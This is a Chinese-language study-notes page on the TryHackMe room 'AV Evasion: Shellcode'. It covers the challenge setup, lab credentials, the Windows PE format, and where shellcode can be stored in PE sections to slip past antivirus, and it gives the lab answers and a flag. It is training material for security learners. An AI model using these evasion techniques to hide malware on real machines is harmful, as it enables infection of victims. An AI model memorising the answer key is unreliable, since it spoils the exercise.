<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-tryhackme/red-teaming/host-evasions/AV Evasion Shellcode - AV 绕过：Shellcode" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">AV Evasion Shellcode - AV 绕过：Shellcode | PgDn&#x27;s Notes</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://pgup-code.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://pgup-code.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://pgup-code.github.io/docs/tryhackme/red-teaming/host-evasions/AV Evasion Shellcode - AV 绕过：Shellcode"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="AV Evasion Shellcode - AV 绕过：Shellcode | PgDn&#x27;s Notes"><meta data-rh="true" name="description" content="学习 shellcode 编码、打包、绑定器和加密器。"><meta data-rh="true" property="og:description" content="学习 shellcode 编码、打包、绑定器和加密器。"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://pgup-code.github.io/docs/tryhackme/red-teaming/host-evasions/AV Evasion Shellcode - AV 绕过：Shellcode"><link data-rh="true" rel="alternate" href="https://pgup-code.github.io/docs/tryhackme/red-teaming/host-evasions/AV Evasion Shellcode - AV 绕过：Shellcode" hreflang="en"><link data-rh="true" rel="alternate" href="https://pgup-code.github.io/docs/tryhackme/red-teaming/host-evasions/AV Evasion Shellcode - AV 绕过：Shellcode" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="PgDn&#39;s Notes RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="PgDn&#39;s Notes Atom Feed"><link rel="stylesheet" href="/assets/css/styles.ebd0f903.css">
<script src="/assets/js/runtime~main.e19854ae.js" defer="defer"></script>
<script src="/assets/js/main.94a3b921.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="My Note Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="My Note Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">PgDn Notes</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/category/red-teaming---红队">TryHackMe</a><a class="navbar__item navbar__link" href="/docs/category/docusaurus-备忘录">备忘录</a><a class="navbar__item navbar__link" href="/blog">博客</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/PgUp-code/PgUp-code.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/category/red-teaming---红队">Red Teaming - 红队</a><button aria-label="Collapse sidebar category &#x27;Red Teaming - 红队&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/category/host-evasions---主机规避">Host Evasions - 主机规避</a><button aria-label="Collapse sidebar category &#x27;Host Evasions - 主机规避&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Windows Internals - Windows 内部原理">Windows Internals - Windows 内部原理</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Introduction to Windows API - Windows API简介">Introduction to Windows API - Windows API简介</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Abusing Windows Internals - 滥用 Windows 内部机制">Abusing Windows Internals - 滥用 Windows 内部机制</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Introduction to Antivirus - 防病毒简介">Introduction to Antivirus - 防病毒简介</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/AV Evasion Shellcode - AV 绕过：Shellcode">AV Evasion Shellcode - AV 绕过：Shellcode</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Obfuscation Principles - 混淆原则">Obfuscation Principles - 混淆原则</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Signature Evasion - 签名规避">Signature Evasion - 签名规避</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Bypassing UAC - 绕过 UAC">Bypassing UAC - 绕过 UAC</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Runtime Detection Evasion - 运行时检测规避">Runtime Detection Evasion - 运行时检测规避</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Evading Logging and Monitoring - 绕过日志记录和监控">Evading Logging and Monitoring - 绕过日志记录和监控</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Living Off the Land - 利用现成工具">Living Off the Land - 利用现成工具</a></li></ul></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/category/red-teaming---红队"><span itemprop="name">Red Teaming - 红队</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/category/host-evasions---主机规避"><span itemprop="name">Host Evasions - 主机规避</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">AV Evasion Shellcode - AV 绕过：Shellcode</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>AV Evasion Shellcode - AV 绕过：Shellcode</h1></header><blockquote>
<p>学习 shellcode 编码、打包、绑定器和加密器。</p>
<p><a href="https://tryhackme.com/room/avevasionshellcode" target="_blank" rel="noopener noreferrer">TryHackMe | AV Evasion: Shellcode</a></p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction---简介">Introduction - 简介<a href="#introduction---简介" class="hash-link" aria-label="Direct link to Introduction - 简介" title="Direct link to Introduction - 简介">​</a></h2>
<p>在本节中，我们将探索如何构建和交付有效载荷，重点关注如何避免被常见的 AV 引擎检测到。我们将讨论作为攻击者可用的不同技术，并讨论每种技术的优缺点。</p>
<p><strong>目标：</strong></p>
<ul>
<li>学习如何制作 shellcode。</li>
<li>探索分阶段有效载荷的优缺点。</li>
<li>创建隐蔽的 shellcode，以避免 AV 检测。</li>
</ul>
<p><strong>前提要求：</strong></p>
<p>建议你先了解一些 <a href="https://tryhackme.com/room/introtoav" target="_blank" rel="noopener noreferrer">关于防病毒软件的工作原理</a>，以及对加密和编码的基础理解。虽然不严格要求，但对基本汇编语言的一些了解会有所帮助。此外，建议对阅读代码和理解函数（C、C#）有一定了解。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="challenge---挑战">Challenge - 挑战<a href="#challenge---挑战" class="hash-link" aria-label="Direct link to Challenge - 挑战" title="Direct link to Challenge - 挑战">​</a></h2>
<p>在这个挑战中，我们准备了一台带有 Web 应用程序的 Windows 机器，允许你上传你的 payload。一旦上传，payload 会被 AV 扫描并在未检测到恶意代码时执行。这个挑战的主要目标是绕过安装在虚拟机上的 Antivirus 软件，并在文件系统中捕获 flag。你可以通过上传文件到 <code>http://10.10.14.106/</code>，尝试本房间讨论的所有技巧。</p>
<p>记住以下几点：</p>
<ul>
<li>尝试结合本房间讨论的不同技巧。</li>
<li>网站仅支持 EXE 文件。</li>
<li>一旦 AV 扫描上传的文件并且未检测到恶意代码，文件将会执行。因此，如果一切按正确方式配置，你应该能够获得一个反向 shell。</li>
</ul>
<p><img decoding="async" loading="lazy" alt="AV Challenge Web App" src="/assets/images/7a5c9d8d5501eaed9d0b677d94266414-b48d331e6cfb06a679d01b9d76be7b89.png" width="829" height="757" class="img_ev3q"></p>
<p>你可以先忽略此任务中的问题，但请确保在成功绕过 AV 并获得 shell 后再回头回答这些问题。</p>
<p>在继续到下一部分之前，先部署附带的虚拟机以跟进本房间的内容！虚拟机会在浏览器中自动部署，并应自动显示在分屏视图中。如果看不到虚拟机，请使用页面右上角的蓝色 “Show Split View” 按钮。如果你更倾向于通过 RDP 连接，可以使用以下凭据：</p>
<p><strong>Username</strong>: thm</p>
<p><strong>Password</strong>: Password321</p>
<p>部分任务还需要使用 AttackBox，这也是启动它的好时机。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="pe-structure---pe-结构">PE Structure - PE 结构<a href="#pe-structure---pe-结构" class="hash-link" aria-label="Direct link to PE Structure - PE 结构" title="Direct link to PE Structure - PE 结构">​</a></h2>
<p>此任务突出展示了 Windows 可执行文件 PE 数据结构的一些高层次核心要素。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="什么是-pe-文件">什么是 PE 文件？<a href="#什么是-pe-文件" class="hash-link" aria-label="Direct link to 什么是 PE 文件？" title="Direct link to 什么是 PE 文件？">​</a></h3>
<p>PE（可移植执行文件）是 Windows 可执行文件格式，它是一种数据结构，包含了文件中执行所需的信息。PE 结构用于在磁盘上组织可执行文件代码。Windows 操作系统组件，如 Windows 加载器和 DOS 加载器，可以根据 PE 文件中解析出的信息将文件加载到内存并执行。</p>
<p>一般来说，Windows 二进制文件（如 EXE、DLL 和目标代码文件）的默认文件结构是相同的 PE 结构，适用于 Windows 操作系统，无论是 x86 还是 x64 CPU 架构。</p>
<p>PE 结构包含多个部分，这些部分保存着关于二进制文件的信息，如元数据和指向外部库内存地址的链接。PE 结构的一个部分是 <strong>PE 头</strong>，它包含元数据信息、指针和内存中地址部分的链接。另一个部分是 <strong>数据段</strong>，它包含运行程序所需的容器信息，诸如可执行代码、资源、库链接、数据变量等。</p>
<p><img decoding="async" loading="lazy" alt="PE Structure" src="/assets/images/ad61ff4aa1d4f649c02348dfa32eb613-b3c39ba7c360015118177b77cb88c60c.png" width="762" height="555" class="img_ev3q">)</p>
<ol>
<li>PE 结构中有不同类型的数据容器，每个容器保存不同的数据：<!-- -->
<ol>
<li><strong>.text</strong>：存储程序的实际代码。</li>
<li><strong>.data</strong>：保存已初始化和已定义的变量。</li>
<li><strong>.bss</strong>：存储未初始化的数据（声明的变量没有赋值）。</li>
<li><strong>.rdata</strong>：包含只读数据。</li>
<li><strong>.edata</strong>：包含可导出的对象和相关的表信息。</li>
<li><strong>.idata</strong>：包含导入的对象和相关的表信息。</li>
<li><strong>.reloc</strong>：包含图像重定位信息。</li>
<li><strong>.rsrc</strong>：链接程序使用的外部资源，如图像、图标、嵌入式二进制文件和清单文件（包含关于程序版本、作者、公司和版权的所有信息）。</li>
</ol>
</li>
</ol>
<p>PE 结构是一个庞大且复杂的主题，我们不会深入讨论头部和数据部分的细节。本任务提供了 PE 结构的高层概述。如果你有兴趣深入了解该主题，建议查看以下 THM 课程，这些课程对该主题进行了更详细的解释：</p>
<ul>
<li><a href="https://tryhackme.com/room/windowsinternals" target="_blank" rel="noopener noreferrer">Windows Internals</a></li>
<li>Dissecting PE Headers</li>
</ul>
<p>你也可以查阅 <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format" target="_blank" rel="noopener noreferrer">Windows PE format</a> 的官方文档，获取更多关于 PE 的详细信息。</p>
<p>在查看 PE 内容时，我们会看到它包含许多无法直接读取的字节。然而，这些字节包含了加载程序运行文件所需的所有细节。以下是 Windows 加载程序读取可执行文件并将其作为进程运行的示例步骤：</p>
<ol>
<li>
<p><strong>头部部分</strong>：解析 DOS 头、Windows 头和可选头，提供关于 EXE 文件的信息。例如：</p>
<ul>
<li>魔术数字以 &quot;MZ&quot; 开头，告诉加载程序这是一个 EXE 文件。</li>
<li>文件签名</li>
<li>文件是为 x86 还是 x64 CPU 架构编译的。</li>
<li>创建时间戳。</li>
</ul>
</li>
<li>
<p><strong>解析节区表的细节</strong>，例如：</p>
<ul>
<li>文件包含的节区数量。</li>
</ul>
</li>
<li>
<p><strong>将文件内容映射到内存</strong>，基于以下信息：</p>
<ul>
<li><strong>入口点地址</strong>和<strong>ImageBase 的偏移量</strong>。</li>
<li><strong>RVA（相对虚拟地址）</strong>：与 ImageBase 相关的地址。</li>
</ul>
</li>
<li>
<p><strong>加载导入、DLL 和其他对象</strong>到内存中。</p>
</li>
<li>
<p><strong>定位入口点地址</strong>并执行主执行函数。</p>
</li>
</ol>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="为什么我们需要了解-pe-结构">为什么我们需要了解 PE 结构？<a href="#为什么我们需要了解-pe-结构" class="hash-link" aria-label="Direct link to 为什么我们需要了解 PE 结构？" title="Direct link to 为什么我们需要了解 PE 结构？">​</a></h3>
<p>了解 PE 结构有几个原因。首先，由于我们将讨论打包和解包等话题，这些技术需要详细了解 PE 结构。</p>
<p>另一个原因是，AV 软件和恶意软件分析师分析 EXE 文件时，会基于 PE 头部和其他 PE 节区中的信息。因此，要创建或修改具备 AV 绕过能力的恶意软件，并将其定向到 Windows 机器，我们需要了解 Windows 可执行文件（Portable Executable）的结构，以及如何存储恶意的 shellcode。</p>
<p>我们可以通过定义和初始化 shellcode 变量，来控制将 shellcode 存储在哪个数据节区。以下是一些示例，展示了如何在 PE 文件中存储 shellcode：</p>
<ol>
<li>将 shellcode 定义为主函数内的局部变量，将其存储在 <strong>.TEXT</strong> 节区中。</li>
<li>将 shellcode 定义为全局变量，将其存储在 <strong>.Data</strong> 节区中。</li>
<li>另一种技术是将 shellcode 作为原始二进制数据存储在图标图像中，并在代码中链接它，这样它会出现在 <strong>.rsrc</strong> 数据节区中。</li>
<li>我们还可以添加一个自定义数据节区来存储 shellcode。</li>
</ol>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="pe-bear">PE-Bear<a href="#pe-bear" class="hash-link" aria-label="Direct link to PE-Bear" title="Direct link to PE-Bear">​</a></h3>
<p>在附带的虚拟机中，提供了一个 Windows 开发环境，包含了用于解析 EXE 文件并读取我们讨论过的详细信息的工具。为了方便您使用，我们已经在桌面上提供了 PE-Bear 软件的副本，您可以使用它来检查 PE 结构：头部、节区等。PE-Bear 提供了一个图形用户界面，展示所有相关的 EXE 文件详细信息。</p>
<p>要加载 EXE 文件进行分析，您可以选择 <strong>文件</strong> -&gt; <strong>加载 PEs</strong>（Ctrl + O）。</p>
<p><img decoding="async" loading="lazy" alt="PE-Bear: The Main Windows" src="/assets/images/c51856efd63b36680857498bac814469-9045b991d50f3645dd9668c60d6c2e1e.png" width="607" height="446" class="img_ev3q"></p>
<p>一旦文件加载完成，我们就可以看到所有的 PE 详细信息。以下截图展示了加载的文件的 PE 详细信息，包括我们在本任务中讨论过的头部和节区。</p>
<p><img decoding="async" loading="lazy" alt="PE-Bear a File" src="/assets/images/78dca06d1d1e4249f25734af8082b8be-87a5e8fad7f8a480152d8254996c82ee.png" width="809" height="466" class="img_ev3q"></p>
<p>现在是时候动手试一试了！加载 <strong>thm-intro2PE.exe</strong> 文件以回答下面的问题。该文件位于以下路径：<code>c:\Tools\PE files\thm-intro2PE.exe</code></p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>thm-intro2PE.exe 文件的 MD5 哈希值的最后 6 位是什么？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">530949</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>thm-intro2PE.exe 文件的 Magic Number（以十六进制表示）是多少？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">5A4D</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>thm-intro2PE.exe 文件的入口点（Entry Point）值是多少？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">12E4</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>thm-intro2PE.exe 文件共有多少个节（Sections）？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">7</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>自定义节可以用来存储额外数据。恶意软件开发者利用这一技术创建一个包含其恶意代码的新节，并劫持程序流程，使程序跳转并执行新节中的内容。该额外节的名称是什么？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.flag</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>检查该额外节的内容。Flag 是什么？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{PE-N3w-s3ction!}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 